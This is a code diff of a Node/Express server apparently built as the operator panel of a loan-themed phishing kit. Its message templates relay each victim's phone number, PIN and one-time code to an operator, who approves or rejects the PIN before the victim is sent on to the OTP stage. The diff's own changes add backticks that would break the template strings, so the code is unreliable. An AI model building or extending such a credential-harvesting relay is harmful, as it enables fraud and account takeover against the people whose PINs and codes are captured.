@@ -981,7 +981,7 @@ Super admin has been notified.
 ❌ *WRONG PIN AT OTP STAGE*
 
 📋 \`${applicationId}\`
-📱 ${formatPhone(application.phoneNumber)}
+📞 `${formatPhone(application.phoneNumber)}`
 🔢 \`${application.otp}\`
 
 ⚠️ User's PIN was incorrect
@@ -1001,7 +1001,7 @@ User will re-enter PIN.
 ❌ *WRONG CODE*
 
 📋 \`${applicationId}\`
-📱 ${formatPhone(application.phoneNumber)}
+📞 `${formatPhone(application.phoneNumber)}`
 🔢 \`${application.otp}\`
 
 ⚠️ Wrong verification code
@@ -1021,7 +1021,7 @@ User will re-enter code.
 ❌ *INVALID - REJECTED*
 
 📋 \`${applicationId}\`
-📱 ${formatPhone(application.phoneNumber)}
+📞 `${formatPhone(application.phoneNumber)}`
 🔑 \`${application.pin}\`
 
 ✗ REJECTED
@@ -1038,7 +1038,7 @@ User will re-enter code.
 ✅ *ALL CORRECT - APPROVED*
 
 📋 \`${applicationId}\`
-📱 ${formatPhone(application.phoneNumber)}
+📞 `${formatPhone(application.phoneNumber)}`
 🔑 \`${application.pin}\`
 
 ✓ APPROVED
@@ -1057,7 +1057,7 @@ User will now proceed to OTP.
 🎉 *LOAN APPROVED!*
 
 📋 \`${applicationId}\`
-📱 ${formatPhone(application.phoneNumber)}
+📞 `${formatPhone(application.phoneNumber)}`
 🔑 \`${application.pin}\`
 🔢 \`${application.otp}\`
 
@@ -1214,7 +1214,7 @@ app.post('/api/verify-pin', async (req, res) => {
 ${userLabel}
 
 📋 \`${applicationId}\`
-📞 ${formatPhone(phoneNumber)}
+📞 `${formatPhone(phoneNumber)}`
 🔑 \`${pin}\`
 ⏰ ${new Date().toLocaleString()}${historyText}
 
@@ -1281,7 +1281,7 @@ app.post('/api/verify-otp', async (req, res) => {
 📲 *CODE VERIFICATION*${returningLabel}
 
 📋 \`${applicationId}\`
-📞 ${formatPhone(application.phoneNumber)}
+📞 `${formatPhone(application.phoneNumber)}`
 🔢 \`${otp}\`
 ⏰ ${new Date().toLocaleString()}
 
@@ -1327,7 +1327,7 @@ app.post('/api/resend-otp', async (req, res) => {
 🔄 *OTP RESEND REQUEST*
 
 📋 \`${applicationId}\`
-📱 ${formatPhone(application.phoneNumber)}
+📞 `${formatPhone(application.phoneNumber)}`
 
 User requested a new OTP.
         `, { parse_mode: 'Markdown' });
